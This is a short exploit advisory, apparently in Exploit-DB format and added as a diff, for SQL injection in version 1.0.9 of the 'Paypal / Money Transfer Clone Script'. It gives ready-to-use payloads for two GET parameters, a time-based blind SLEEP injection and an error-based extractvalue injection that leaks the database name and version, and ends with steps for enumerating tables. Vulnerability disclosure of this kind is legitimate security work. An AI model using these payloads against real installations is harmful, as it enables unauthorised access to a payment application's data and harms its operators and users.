@@ -1,0 +1,36 @@
+# Exploit Title: Paypal / Money Transfer Clone Script 1.0.9 - SQL Injection
+# Dork: N/A
+# Date: 2018-02-10
+# Exploit Author: Borna nematzadeh (L0RD) or borna.nematzadeh123@gmail.com
+# Vendor Homepage:
+https://www.phpscriptsmall.com/product/paypal-money-transfer-clone/
+# Version: 1.0.9
+# Category: Webapps
+# CVE: N/A
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands.
+# # # # #
+# Proof of Concept :
+
+SQLI :
+
+http://localhost/PATH/registrationpersonal.php?id=[SQL]
+
+# Parameter : id (GET)
+#    Type: Type: AND/OR time-based blind
+#    Title: MySQL >= 5.0.50 AND time-based blind
+#    Payload: AND SLEEP(10)
+
+#########################################################
+
+http://localhost/PATH/registrationmail.php?acctype=[SQL]
+
+# Parameter : acctype (GET)
+#    Type : Error based
+#    Title : MySQL >= 5.0 AND error based - Extractvalue (XPATH query)
+#    Payload : 1' and
+extractvalue(1,/*!00000Concat(0x3a,database(),0x3a,0x3a,version())*/)%23
+
+# Description: First inject payload into parameter and load URL . then fill all fields and click "continue".
+# You will have version and db_name in the next page . You can find all tables using XPATH query and see result in the next page .
